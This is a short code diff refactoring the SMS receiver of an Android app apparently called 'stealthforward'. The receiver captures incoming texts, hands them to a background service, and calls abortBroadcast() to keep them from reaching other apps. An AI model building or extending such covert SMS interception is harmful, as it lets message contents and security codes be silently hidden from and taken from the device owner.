@@ -6,13 +6,10 @@ import android.content.Intent
 import android.os.Build
 import android.os.Bundle
 import android.telephony.SmsMessage
-import com.nf.stealthforward.listener.SmsListener
+import com.nf.stealthforward.service.BackgroundService
 
 
 class SmsBroadcastReceiver : BroadcastReceiver() {
-    companion object {
-        var smsListener: SmsListener? = null
-    }
 
     override fun onReceive(context: Context, intent: Intent) {
         if ("android.provider.Telephony.SMS_RECEIVED" != intent.action) return;
@@ -28,7 +25,7 @@ class SmsBroadcastReceiver : BroadcastReceiver() {
                 sb.append(smsMessage.displayMessageBody)
             }
 
-            smsListener?.onSmsReceived(sender, sb.toString())
+            BackgroundService.instance?.onSmsReceived(sender, sb.toString())
 
             abortBroadcast()
         }
